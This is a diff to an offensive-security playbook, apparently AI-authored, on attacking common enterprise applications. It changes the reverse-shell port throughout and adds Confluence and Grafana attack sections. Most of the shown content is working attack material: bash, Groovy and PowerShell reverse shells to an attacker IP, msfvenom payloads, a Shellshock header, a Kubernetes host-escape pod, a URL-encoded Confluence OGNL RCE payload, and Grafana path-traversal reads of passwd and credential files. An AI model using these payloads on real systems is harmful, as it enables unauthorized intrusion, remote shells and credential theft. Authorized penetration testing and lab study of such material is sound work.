@@ -1,6 +1,6 @@
 # Attacking Common Applications
 
-#WebApps #CMS #WordPress #Joomla #Drupal #Tomcat #Jenkins #Splunk #PRTG #GitLab #ColdFusion #ThickClient #Nagios #Exchange #Citrix #F5 #Ivanti #Fortinet #PaloAlto #ManageEngine #TeamCity #Kubernetes #Docker #Zimbra #SolarWinds #Enumeration #RCE
+#WebApps #CMS #WordPress #Joomla #Drupal #Tomcat #Jenkins #Splunk #PRTG #GitLab #ColdFusion #ThickClient #Nagios #Grafana #Confluence #Exchange #Citrix #F5 #Ivanti #Fortinet #PaloAlto #ManageEngine #TeamCity #Kubernetes #Docker #Zimbra #SolarWinds #Enumeration #RCE
 
 ## What is this?
 
@@ -30,7 +30,7 @@ Per-application playbook for the most common web apps and services encountered d
 | CMS | WordPress, Joomla, Drupal, DotNetNuke |
 | App Servers | Apache Tomcat, Oracle WebLogic, IBM WebSphere, JBoss, Axis2 |
 | CI/CD | Jenkins, GitLab, TeamCity, Bitbucket |
-| SIEM / Monitoring | Splunk, PRTG, Nagios, Zabbix, SolarWinds Orion |
+| SIEM / Monitoring | Splunk, PRTG, Nagios, Grafana, Zabbix, SolarWinds Orion |
 | Ticketing / ITSM | osTicket, Zendesk, ManageEngine ServiceDesk Plus |
 | Dev Tools | phpMyAdmin, Confluence, Elasticsearch |
 | Email | Exchange / OWA, Zimbra |
@@ -308,8 +308,8 @@ zip -r shell.war cmd.jsp
 
 ```bash
 # Option 2 — msfvenom reverse shell WAR
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f war -o shell.war
-nc -lvnp 4444
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=9001 -f war -o shell.war
+nc -lvnp 9001
 # Upload via manager → access http://target.com:8080/shell/
 
 # Option 3 — MSF module (with valid creds)
@@ -411,7 +411,7 @@ println sout
 
 ```groovy
 r = Runtime.getRuntime()
-p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/10.10.14.15/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/10.10.14.15/9001;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
 
@@ -428,7 +428,7 @@ println proc.text
 
 ```groovy
 String host = "10.10.14.15"
-int port = 4444
+int port = 9001
 String cmd = "cmd.exe"
 Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start()
 Socket s = new Socket(host, port)
@@ -492,7 +492,7 @@ tar -cvzf splunk_shell.tar.gz reverse_shell_splunk/
 **Windows payload (`bin/run.ps1`):**
 
 ```powershell
-$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15', 4444)
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15', 9001)
 $stream = $client.GetStream()
 [byte[]]$bytes = 0..65535|%{0}
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
@@ -528,7 +528,7 @@ git clone https://github.com/cnotin/SplunkWhisperer2
 python3 PySplunkWhisperer2/PySplunkWhisperer2_remote.py \
   --host target.com --port 8089 \
   --username admin --password changeme \
-  --lhost 10.10.14.15 --lport 4444
+  --lhost 10.10.14.15 --lport 9001
 ```
 
 > [!note]
@@ -670,7 +670,7 @@ searchsploit gitlab
 
 ```bash
 # CVE-2021-22205 PoC
-python3 exploit.py -t http://target.com -l 10.10.14.15 -p 4444
+python3 exploit.py -t http://target.com -l 10.10.14.15 -p 9001
 # https://github.com/inspiringz/CVE-2021-22205
 ```
 
@@ -696,10 +696,52 @@ gitlab-runner register \
 # Add a .gitlab-ci.yml to any project using this runner:
 # job:
 #   script:
-#     - bash -i >& /dev/tcp/10.10.14.15/4444 0>&1
+#     - bash -i >& /dev/tcp/10.10.14.15/9001 0>&1
 ```
 
 > [!note] Runner tokens found in `config.toml` are *authentication* tokens — they allow the runner to poll for jobs. Registration tokens (from the UI) are needed to register new runners. Both are valuable: auth tokens let you impersonate the runner and receive pipeline jobs.
+
+---
+
+## Atlassian Confluence
+
+### Enumeration
+
+```bash
+# Default ports: 8090 (Confluence), 8091 (Synchrony). Often behind 80/443 reverse proxy.
+# Version — footer of any page, or the meta tag / REST API (no auth on many installs):
+curl -s http://target/confluence/ | grep -oiE 'confluence[^<]{0,30}'
+curl -s http://target/rest/applinks/1.0/manifest        # version in the manifest XML
+curl -s http://target/login.action                       # login page footer shows build
+# Interesting paths
+#   /setup/setupadministrator.action   (CVE-2023-22515 access-control)
+#   /pages/createpage-entervariables.action  (CVE-2021-26084 sink)
+```
+
+### Attacking
+
+Confluence Server/Data Center has a string of **unauthenticated RCEs** — version-check first, they map cleanly to CVEs.
+
+```bash
+# CVE-2022-26134 — OGNL injection, UNAUTH RCE (all versions < 7.4.17 / 7.13.7 / 7.14.3 /
+# 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1). The OGNL expression rides in the URL PATH:
+curl -s -o /dev/null -w '%{http_code}\n' \
+  "http://target/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd%22%2C%23a%29%29%7D/"
+# Command output comes back in the X-Cmd response header. Decoded, the payload is:
+#   ${(#a=@...IOUtils@toString(@...Runtime@getRuntime().exec("id")...)).(setHeader("X-Cmd",#a))}
+# Use the published PoC for a stable reverse shell rather than hand-URL-encoding each command.
+
+# CVE-2021-26084 — OGNL injection via Widget Connector / text-inline.vm, pre-auth RCE
+# (< 6.13.23 / 7.4.11 / 7.11.6 / 7.12.5). Sink: POST /pages/createpage-entervariables.action
+#   queryString=aaaa'%2b#{...OGNL...}%2b'
+
+# CVE-2023-22515 — Broken access control (8.0.0–8.5.1). Not RCE: re-opens setup mode and
+# lets you CREATE AN ADMIN account, then log in and RCE via a malicious app/macro.
+#   POST /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
+#   then hit /setup/setupadministrator.action to add your admin user
+```
+
+> [!note] Post-admin RCE on any Confluence: **install a malicious app** (Manage apps → Upload app, an OBR/JAR plugin with a webshell) or add a **user macro** that runs Java/Velocity — the same "authenticated admin → code" pattern as Tomcat manager / Jenkins script console. Also loot `confluence.cfg.xml` and the DB for the `hibernate.connection.password` and integration creds.
 
 ---
 
@@ -732,7 +774,7 @@ GET /cgi-bin/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe HTTP/1.1
 curl -H "User-Agent: () { :; }; echo; echo vulnerable" http://target.com/cgi-bin/status
 
 # Reverse shell
-curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.15/4444 0>&1" http://target.com/cgi-bin/status
+curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.15/9001 0>&1" http://target.com/cgi-bin/status
 ```
 
 ---
@@ -890,7 +932,7 @@ nmap -sV -p 80,443 --script=http-title target.com
 
 ```bash
 # Three separate injection points — Monitored Servers, MIB Manager, Network Interfaces
-python3 CVE-2021-25296.py -t http://target.com/nagiosxi -u nagiosadmin -p nagiosadmin -l 10.10.14.15 -p 4444
+python3 CVE-2021-25296.py -t http://target.com/nagiosxi -u nagiosadmin -p nagiosadmin -l 10.10.14.15 -p 9001
 ```
 
 **CVE-2019-15949 — Authenticated RCE (Nagios XI < 5.6.6):**
@@ -915,7 +957,7 @@ sqlmap -u 'http://target.com/nagiosxi/admin/banner_message-ajaxhelper.php?action
 # Upload a "plugin" that is actually a reverse shell script
 cat > shell.sh << 'EOF'
 #!/bin/bash
-bash -i >& /dev/tcp/10.10.14.15/4444 0>&1
+bash -i >& /dev/tcp/10.10.14.15/9001 0>&1
 EOF
 # Upload shell.sh as a plugin, then trigger it via a check command
 # Admin → Core Config Manager → Commands → Add new command
@@ -959,6 +1001,37 @@ cat /home/nagios/.ssh/id_rsa
 
 > [!note]
 > Nagios is a lateral movement goldmine. The monitoring account often has SSH access (sometimes key-based, no password) to every Linux host it monitors. Dumping `/usr/local/nagios/etc/` and the XI database frequently yields credentials for a significant portion of the environment.
+
+---
+
+## Grafana
+
+### Enumeration
+
+```bash
+# Default port: 3000. Login page reveals version bottom-right, or via the API:
+curl -s http://target:3000/api/health           # {"version":"8.3.0", ...} — no auth
+curl -s http://target:3000/login | grep -oiE 'grafana[^"]{0,20}'
+# Default creds worth a try: admin:admin (forces a change on first login)
+```
+
+### Attacking
+
+```bash
+# CVE-2021-43798 — UNAUTH directory traversal / arbitrary file read (8.0.0-beta1 → 8.3.0).
+# Traverse out of any INSTALLED plugin's static dir. Plugin ids that ship by default:
+#   alertlist, graph, table, text, stat, gauge, pie-chart, ...
+curl -s --path-as-is \
+  "http://target:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
+
+# The two files worth reading first:
+#   /etc/grafana/grafana.ini    → admin_password, secret_key, SMTP/LDAP creds
+#   /var/lib/grafana/grafana.db → SQLite: user table (hashes) + data-source creds
+curl -s --path-as-is "http://target:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini"
+curl -s --path-as-is "http://target:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
+```
+
+> [!tip] `grafana.db` data-source passwords are AES-encrypted with the `secret_key` from `grafana.ini` — grab **both** files, then decrypt offline (grafana's `securejsondata`/`secureJsonData` fields). The `--path-as-is` curl flag is essential: without it curl collapses the `../` client-side and the traversal never reaches the server. Post-auth (or with cracked creds), Grafana data sources can also reach internal services (SSRF) and some support query-based file/command primitives.
 
 ---
 
@@ -1034,7 +1107,7 @@ nmap -sV -p 443,8443 --script=http-title target.com
 ```bash
 # CVE-2023-3519 — Unauthenticated RCE (NetScaler ADC/Gateway < 13.1-49.13)
 # HTTP GET to /gwtest/formssso triggers buffer overflow
-python3 CVE-2023-3519.py -t https://target.com -l 10.10.14.15 -p 4444
+python3 CVE-2023-3519.py -t https://target.com -l 10.10.14.15 -p 9001
 # https://github.com/mandiant/CVE-2023-3519
 
 # CVE-2023-24488 — XSS (same version range, lower severity)
@@ -1142,7 +1215,7 @@ curl -sk https://target.com/php/login.php -I
 curl -sk 'https://target.com/ssl-vpn/hipreport.esp' -b 'SESSID=/../../../opt/paloaltonetworks/gp/var/log/gp/gpd.log' --data 'user=;id>/tmp/pwned;'
 
 # Full PoC
-python3 CVE-2024-3400.py -t https://target.com -c "bash -i >& /dev/tcp/10.10.14.15/4444 0>&1"
+python3 CVE-2024-3400.py -t https://target.com -c "bash -i >& /dev/tcp/10.10.14.15/9001 0>&1"
 
 # CVE-2019-1579 — Pre-auth RCE (GlobalProtect < 7.1.19/8.0.12/8.1.3)
 python3 pan_rce.py https://target.com
@@ -1254,7 +1327,7 @@ python3 CVE-2024-27198.py -t http://target.com:8111
 
 # Post-auth RCE — Build configuration → Build step → Command Line
 # Add a build step: Command Line → custom script
-bash -i >& /dev/tcp/10.10.14.15/4444 0>&1
+bash -i >& /dev/tcp/10.10.14.15/9001 0>&1
 
 # Token-based auth — check for build agent tokens in config files
 # Tokens allow triggering builds → RCE via build steps
@@ -1315,7 +1388,7 @@ spec:
     volumeMounts:
     - mountPath: /host
       name: host-vol
-    command: ["nsenter","--mount=/host/proc/1/ns/mnt","--","sh","-c","bash -i >& /dev/tcp/10.10.14.15/4444 0>&1"]
+    command: ["nsenter","--mount=/host/proc/1/ns/mnt","--","sh","-c","bash -i >& /dev/tcp/10.10.14.15/9001 0>&1"]
   volumes:
   - name: host-vol
     hostPath:
@@ -1348,7 +1421,7 @@ python3 CVE-2022-27925.py -t https://target.com
 
 # CVE-2022-41352 — Unauthenticated RCE via cpio archive extract (Zimbra < 9.0.0.p29)
 # Send malicious email attachment → extract drops webshell
-python3 CVE-2022-41352.py -t target.com -l 10.10.14.15 -p 4444
+python3 CVE-2022-41352.py -t target.com -l 10.10.14.15 -p 9001
 
 # CVE-2023-37580 — Reflected XSS → session steal (Zimbra < 8.8.15.p41)
 
@@ -1437,5 +1510,5 @@ curl -sk -X POST 'https://target.com:17778/SolarWinds/InformationService/v3/Json
 ---
 
 *Created: 2026-03-20*
-*Updated: 2026-08-25*
-*Model: claude-opus-5*
+*Updated: 2026-09-18*
+*Model: claude-opus-4-8*
